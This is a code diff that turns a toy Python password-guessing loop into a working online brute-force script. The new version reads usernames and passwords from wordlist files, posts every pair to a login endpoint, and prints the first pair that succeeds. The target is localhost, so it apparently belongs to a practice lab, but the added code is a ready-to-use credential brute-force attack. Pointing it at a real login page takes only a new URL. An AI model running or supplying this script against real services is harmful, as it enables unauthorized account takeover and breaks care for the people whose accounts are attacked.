@@ -1,26 +1,34 @@
-crt_uname = "admin"
-crt_pass = "admin"
+import requests
+import time
+
+url = "http://127.0.0.1:5000/login"
 
 attempts = 0
- 
-with open ("adm_list.txt","r") as admlist:
-    for uname in admlist:
-         usrname = uname.strip()
 
-         with open("pwd_list.txt" , "r") as file:
-            for line in file:
-                password = line.strip()
+with open("adm_list.txt") as users:
+    for user in users:
+        username = user.strip()
+
+        with open("pwd_list.txt") as passwords:
+            for pwd in passwords:
+                password = pwd.strip()
                 attempts += 1
-                import time
+
+                data = {
+                    "username": username,
+                    "password": password
+                }
+
+                response = requests.post(url, data=data)
+
+                print(f"[{attempts}] Trying -> {username}:{password}")
+
                 time.sleep(0.1)
 
-                print(f"\nTrying : {usrname} : {password}")
+                if "Login Successful" in response.text:
+                    print("\n🔥 SUCCESS 🔥")
+                    print(f"{username}:{password}")
+                    print(f"Attempts: {attempts}")
+                    exit()
 
-                if password == crt_pass and usrname == crt_uname:
-                    print(f"\n[+] password found! \n")
-                    print(f"Attempts : {attempts}")
-                    print(f"username : {usrname}")
-                    print(f"password : {password}\n")
-                    break
-                else:
-                    print(f"password not found!")
+print("\n❌ No valid credentials found")
